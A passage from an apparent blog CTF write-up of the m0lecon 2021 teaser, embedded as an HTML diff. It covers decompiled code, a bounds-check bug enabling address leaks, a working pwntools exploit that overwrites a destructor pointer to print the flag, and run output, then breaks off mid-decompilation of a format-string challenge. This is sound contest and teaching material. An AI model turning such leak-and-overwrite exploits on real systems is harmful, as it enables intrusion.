@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>m0lecon 2021 Teaser</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/m0lecon-2021-teaser/#little-alchemy">little alchemy</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/m0lecon-2021-teaser/#another-login-and-yet-another-login">another login (and yet another login)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/m0lecon-2021-teaser/#donut-factory">donut factory</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>m0lecon 2021 Teaser</h1>
+    </header>
+
+    <div class="content">
+        <p>I competed in the teaser solo, ending up in 23rd place (dropped 13 places while sleeping rip). I solved the majority of the pwn challenges (fortran :( ) and have included solve scripts and brief explanations for them. Wasn't really feeling like in-depth writeups, but it should be sufficient to get an idea of the solution and you're welcome to contact me if you have questions.</p>
+<span id="continue-reading"></span><h1 id="little-alchemy">little alchemy</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Alchemy is a wonderful world to explore. Are you able to become a skilled scientist? We need your help to discover many mysterious elements!
+</span><span>
+</span><span>nc challs.m0lecon.it 2123
+</span><span>
+</span><span>Note: the flag is inside the binary, and clearly it is different on the remote server. 
+</span></code></pre>
+<p><a href="/ctf/m0lecon-2021-teaser/little-alchemy/littleAlchemy">littleAlchemy</a></p>
+<p>so tl;dr flag is stuck on the stack</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void</span><span> __thiscall Handler:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">Handler</span><span>(Handler </span><span style="color:#f29e74;">*</span><span>this)
+</span><span>
+</span><span>{
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span>sVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  Element:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">Element</span><span>((Element </span><span style="color:#f29e74;">*</span><span>)this</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  Element:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">Element</span><span>((Element </span><span style="color:#f29e74;">*</span><span>)(this </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  Element:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">Element</span><span>((Element </span><span style="color:#f29e74;">*</span><span>)(this </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x50</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  Element:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">Element</span><span>((Element </span><span style="color:#f29e74;">*</span><span>)(this </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x78</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  ElementHandler:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">ElementHandler</span><span>((ElementHandler </span><span style="color:#f29e74;">*</span><span>)(this </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf0</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>  puVar1 </span><span style="color:#f29e74;">=</span><span> flag</span><span style="color:#ccc9c2cc;">;
+</span><span>  sVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>(flag)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* try { // try from 001029b5 to 001029b9 has its CatchHandler @ 001029bc */
+</span><span>  std:</span><span style="color:#f29e74;">:</span><span>copy</span><span style="color:#f29e74;">&lt;</span><span>char_const</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*&gt;</span><span>(flag</span><span style="color:#ccc9c2cc;">,</span><span>puVar1 </span><span style="color:#f29e74;">+ </span><span>sVar2</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(this </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x18</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>and then we get a menu</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Operations: [1]-&gt;Create_element [2]-&gt;Print_element [3]-&gt;Print_all [4]-&gt;Edit_element [5]-&gt;Delete_element [6]-&gt;Copy_name [7]-&gt;Exit
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>ElementHandler:</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">copyName</span><span>(ElementHandler </span><span style="color:#f29e74;">*</span><span>this</span><span style="color:#ccc9c2cc;">,</span><span>Element </span><span style="color:#f29e74;">*</span><span>param_1</span><span style="color:#ccc9c2cc;">,</span><span>Element </span><span style="color:#f29e74;">*</span><span>param_2)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">long</span><span> lVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span>sVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 uVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#ffa759;">if </span><span>((param_1 </span><span style="color:#f29e74;">== </span><span>(Element </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span>) </span><span style="color:#f29e74;">|| </span><span>(param_2 </span><span style="color:#f29e74;">== </span><span>(Element </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span>)) {
+</span><span>    uVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">else </span><span>{
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(param_1[</span><span style="color:#ffcc66;">8</span><span>] </span><span style="color:#f29e74;">== </span><span>(Element)</span><span style="color:#ffcc66;">0x0</span><span>) {
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(param_1 </span><span style="color:#f29e74;">== </span><span>(Element </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span>) {
+</span><span>        lVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      </span><span style="color:#ffa759;">else </span><span>{
+</span><span>        lVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">__dynamic_cast</span><span>(param_1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>Element:</span><span style="color:#f29e74;">:</span><span>typeinfo</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>ComposedElement:</span><span style="color:#f29e74;">:</span><span>typeinfo</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      sVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(lVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* try { // try from 00102814 to 00102818 has its CatchHandler @ 00102822 */
+</span><span>      std:</span><span style="color:#f29e74;">:</span><span>copy</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*&gt;
+</span><span>                ((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(lVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x18</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(lVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28 </span><span style="color:#f29e74;">+ </span><span>sVar2)</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(param_2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x18</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      std:</span><span style="color:#f29e74;">:</span><span>copy</span><span style="color:#f29e74;">&lt;</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*&gt;
+</span><span>                ((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x18</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)(param_2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x18</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    uVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return</span><span> uVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>copyName is vulnerable when copying a ComposedElement into an Element -- it does not do bounds checks or null terminating. This allows you to leak addresses inside later heap chunks by overflowing right up to the address and then printing. I leaked the program base and the address of the flag in the stack in this way.</p>
+<p>I then create an element and overwrite the destructor address with the showSources function, as well as overwriting the char pointer to one of the components with the flag address. At that point all I need to do is free the Element and it will execute showSources, printing the flag.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>hashlib </span><span style="color:#ffa759;">import </span><span>sha256
+</span><span>
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;littleAlchemy&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">solvepow</span><span>(</span><span style="color:#ffcc66;">p</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n</span><span>):
+</span><span>    s </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    starting </span><span style="color:#f29e74;">= </span><span>s</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;with &#39;</span><span>)[</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">10</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>    s1 </span><span style="color:#f29e74;">= </span><span>s</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;in &#39;</span><span>)[</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>][</span><span style="color:#ccc9c2cc;">:</span><span>n]
+</span><span>    i </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Solving PoW...&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#ffd580;">sha256</span><span>((starting</span><span style="color:#f29e74;">+</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">hexdigest</span><span>()[</span><span style="color:#f29e74;">-</span><span>n</span><span style="color:#ccc9c2cc;">:</span><span>] </span><span style="color:#f29e74;">== </span><span>s1</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>():
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Solved!&quot;</span><span>)
+</span><span>            p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(starting </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        i </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;challs.m0lecon.it&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2123</span><span>)
+</span><span>        </span><span style="color:#ffd580;">solvepow</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">5</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>r
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">send_menu</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">msg</span><span>):
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(msg)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Exit</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt;&quot;</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Exit</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt;&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 0 -1 -1&quot;</span><span>)
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 1 -1 -3&quot;</span><span>)
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 1 aaaaaaaabaaaaaaacaaaaaaa&quot;</span><span>)
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;6 1 0&quot;</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;2 0&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;aaaaaaaabaaaaaaacaaaaaaa&quot;</span><span>)
+</span><span>    program_base </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>)) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x5d50
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Exit</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt;&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;leaked program_base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(program_base))
+</span><span>
+</span><span>    show_sources </span><span style="color:#f29e74;">= </span><span>program_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x5d60 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">8
+</span><span>    flag_addr </span><span style="color:#f29e74;">= </span><span>program_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x403b </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x18
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 1 aaaaaaaabaaaaaaacaaaaaaadaaaaaaa&quot;</span><span>)
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 2 -1 -3&quot;</span><span>)
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;6 1 2&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;2 2&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaa&quot;</span><span>)
+</span><span>    flag_addr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span>(</span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>)) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x18
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Exit</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt;&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;leaked flag addr: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(flag_addr))
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 1 aaaaaaaabaaaaaaacaaaaaaa&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(show_sources) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(flag_addr </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x18</span><span>))
+</span><span>    </span><span style="color:#ffd580;">send_menu</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;6 1 0&quot;</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;5 1&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;7&quot;</span><span>)
+</span><span>
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>((</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag found: &quot; </span><span style="color:#f29e74;">+ </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;(ptm{.*})&quot;</span><span style="color:#ccc9c2cc;">, </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span><span>
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Solving PoW...
+</span><span>Solved!
+</span><span>/home/sky/Dropbox/ctf/m0lecon-teaser/little-alchemy/solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+</span><span>  p.sendline(starting + str(i))
+</span><span>[*] leaked program_base: 0x563fd3bf3000
+</span><span>[*] leaked flag addr: 0x7fff12a2a888
+</span><span>[+] Receiving all data: Done (201B)
+</span><span>[*] Closed connection to challs.m0lecon.it port 2123
+</span><span>[*] flag found: ptm{vT4bl3s_4r3_d4ng3r0us_019}
+</span><span>[*] Switching to interactive mode
+</span><span>[*] Got EOF while reading in interactive
+</span><span>$  
+</span></code></pre>
+<h1 id="another-login-and-yet-another-login">another login (and yet another login)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Just another simple login bypass challenge.
+</span><span>
+</span><span>nc challs.m0lecon.it 1907
+</span></code></pre>
+<p><a href="/ctf/m0lecon-2021-teaser/another_login/chall">chall</a></p>
+<p><a href="/ctf/m0lecon-2021-teaser/yet_another_login/login">login</a> (patched)</p>
+<p>Neat challenge!  Never seen a format string challenge quite like this. Apparently there was an unintended solution and they put out a patched version later on. I solved it the intended way so my solution worked for both of them out of the box (was nice to get those points later on lol).</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">signin</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span>sVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span>sVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">uint</span><span> uVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_64</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_60</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>local_58</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_50</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_48</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_40</span><span style="color:#ccc9c2cc;">;
